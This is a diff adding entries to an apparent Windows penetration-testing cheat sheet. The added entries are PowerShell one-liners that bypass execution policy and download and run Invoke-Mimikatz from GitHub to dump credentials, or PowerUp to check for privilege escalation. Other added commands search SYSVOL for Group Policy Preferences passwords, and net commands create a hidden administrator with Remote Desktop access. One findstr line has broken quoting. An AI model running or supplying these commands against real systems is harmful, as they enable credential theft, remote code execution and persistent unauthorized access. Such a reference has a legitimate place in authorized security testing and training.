@@ -1,10 +1,26 @@
 # Misc windows stuff
 
+Powershell Oneliners
+
+```sh
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
+powershell.exe -exec bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
+powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”
+```
+
+Find GPP Passwords in SYSVOL
+
+```sh
+findstr /S cpassword "nv:logonserver\sysvol\*.xml
+findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)"
+```
+
 Add admin user.
 
 ```sh
 net user username password /add
 net localgroup administrators username /add
+net localgroup "Remote Desktop Users" username /add
 ```
 
 ```sh
